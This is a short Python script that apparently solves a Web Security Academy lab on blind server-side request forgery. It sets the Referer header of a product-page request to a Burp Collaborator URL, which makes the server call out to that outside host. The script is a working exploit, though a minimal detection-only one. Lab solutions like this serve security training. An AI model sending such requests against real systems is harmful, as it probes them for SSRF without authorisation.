#!/usr/bin/python3

import requests
from requests.api import head

def connection(url, endpoint):

    headers = {
        # Since the app is fetching data from the Referer header, simply putting the Burp collaborator url in the Referer header, we can solve the challenge.
        'referer': 'https://ep7ivb317sj3f4tgcfsxo2ouclib60.burpcollaborator.net',
    }

    r = requests.get(url + endpoint, headers=headers)

    print(r.status_code)

if __name__ == '__main__':
    url = "https://acc51f311e811255c1780143002100c8.web-security-academy.net"
    endpoint = "/product?productId=1"

    connection(url, endpoint)